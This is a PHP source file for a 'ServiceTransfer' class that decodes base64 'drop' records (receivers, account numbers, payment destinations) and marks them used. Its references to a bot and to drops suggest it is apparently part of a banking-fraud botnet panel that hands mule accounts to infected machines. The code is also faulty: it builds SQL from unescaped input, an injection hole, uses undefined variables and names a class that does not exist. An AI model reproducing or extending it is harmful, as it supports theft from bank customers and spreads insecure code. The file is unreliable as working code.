<?php

class ServiceTransfer {
    private $bot, $system, $mysqli, $trans;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
    }
    
    function _get_trans($row){       
        $row->info = json_decode(base64_decode($row->info));
        
        $drop = &$row->info->drop;
        $drop['other'] = get_object_vars($row->info->drop->other);
        $system = &$row->info->system;
        
        $trans_id = $row->id;
        
        $return = array();
        $return['did'] = $drop->id;
        $return['tid'] = $trans_id;
        $return['name'] = $drop->name;
        $return['receiver'] = $drop->receiver;
        $return['destination'] = $drop->destination;
        $return['acc'] = accNumFormat($drop->acc);
        $return['vat'] = $drop->vat;
        $return['vatp'] = $system->vat;
        $return['summ'] = $system->sum;
        
        if($drop->vat != '0'){
            $return['target'] = $drop->destination . "\n В том числе НДС (".$drop->vat."%)" . ' ' . $system->vat;
        }else{
            $return['target'] = $drop->destination . "\n НДС не облагается.";
        }
        
        $return['other'] = $drop->other;
        
        $this->trans[] = $return;
    }
    
    function getTransfer($acc = ''){        
        $this->trans = array();
        
        if(empty($acc)){
            $this->db->query("SELECT * FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."') AND (system = '".$system->nid."') AND (status != '0')", null, array('TransferService', '_get_trans'), false);
        }else{
            $this->db->query("SELECT * FROM bf_transfers WHERE (prefix = '".$prefix."') AND (uid = '".$uid."') AND (system = '".$system->nid."') AND (system = '".$system->nid."') AND (acc = '".$acc."') AND (status != '0')", null, array('TransferService', '_get_trans'), false);
        }
        
        if(count($this->trans) > 0){
            return $this->trans;
        }else{
            return false;
        }
    }
    
    function setTransfer($id = ''){
        if(empty($id)) return false;
        $this->db->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$id.'\') LIMIT 1');
	return true;
    }
}

RegisterService("ServiceTransfer");

?>